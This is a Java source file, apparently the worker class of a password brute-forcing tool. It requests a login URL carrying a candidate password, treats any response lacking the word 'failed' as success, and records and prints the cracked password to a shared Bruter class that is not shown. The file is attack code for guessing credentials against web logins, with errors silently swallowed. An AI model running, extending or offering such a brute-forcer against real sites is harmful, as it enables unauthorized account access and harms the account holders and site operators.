import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Tester extends Thread {
    public Tester(String password, String url){
        try{
            if(!getHTML(url).contains("failed")){
                Bruter.isFound = true;
                Bruter.password = password;
                System.out.println("Password found its :"+password);
            }else{
                System.out.println("Failed :"+password);
            }
        }catch (Exception e){

        }

    }
    public static String getHTML(String urlToRead) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlToRead);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String line;
        while ((line = rd.readLine()) != null) {
            result.append(line);
        }
        rd.close();
        return result.toString();
    }
}
